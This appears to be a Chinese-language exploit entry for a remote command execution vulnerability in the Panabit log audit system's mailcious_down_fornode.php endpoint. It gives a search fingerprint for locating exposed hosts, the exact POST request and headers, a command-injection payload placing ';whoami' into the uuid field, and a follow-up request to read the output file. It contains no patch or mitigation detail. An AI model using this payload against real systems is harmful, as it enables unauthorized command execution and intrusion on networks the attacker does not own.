# panabit日志审计系统mailcious_down_fornode远程命令执行漏洞

- **系统**：panabit　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="Panabit 日志系统"`
- **请求**：`POST /mailcious_down_fornode.php HTTP/1.1`
- **关键头**：`Content-Length: 40`　`Content-Type: application/x-www-form-urlencoded`　`X-Forwarded-For: 127.0.0.1,192.168.170.105,172.10.107.143`

**请求体 / payload**
```
action=check&uuid=;whoami > pobjejsh.txt

获取命令执行结果
GET /pobjejsh.txt HTTP/1.1
Host:
Content-Type: text/plain
\[panabit-mailcious-down-fornode-远程命令执行.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- panabit日志审计系统mailcious\_down\_fornode远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Panabit panalog